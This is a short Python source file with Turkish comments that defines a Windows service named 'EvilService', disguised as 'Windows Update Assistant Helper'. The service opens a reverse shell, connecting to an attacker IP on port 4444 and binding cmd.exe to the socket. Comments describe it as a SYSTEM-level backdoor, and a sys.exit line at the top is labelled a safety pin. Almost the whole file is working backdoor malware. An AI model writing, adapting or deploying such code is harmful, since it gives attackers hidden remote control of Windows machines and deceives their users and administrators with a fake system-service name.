import servicemanager
import socket
import subprocess
import sys
import win32serviceutil
import win32service
import win32event

# --- EMNİYET PİMİ ---
# Bu kodun Windows Servisi olarak kurulması gerekir.
sys.exit("UYARI: Bu kod SYSTEM yetkisinde arka kapı açar.")

class EvilService(win32serviceutil.ServiceFramework):
    _svc_name_ = "WindowsUpdateAssist" # Masum İsim
    _svc_display_name_ = "Windows Update Assistant Helper"
    
    def SvcDoRun(self):
        # 1. PAYLOAD (Weaponized Part)
        # Simülasyon: f.write("Servis Başladı")
        # Gerçek: Hacker'a bağlantı kur (Reverse Shell)
        
        attacker_ip = "192.168.1.5"
        attacker_port = 4444
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            s.connect((attacker_ip, attacker_port))
            
            # cmd.exe'yi sokete bağla (Tüm çıktı hacker'a gider)
            subprocess.Popen(["cmd.exe"], stdout=s, stderr=s, stdin=s)
            
        except:
            pass
            
if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(EvilService)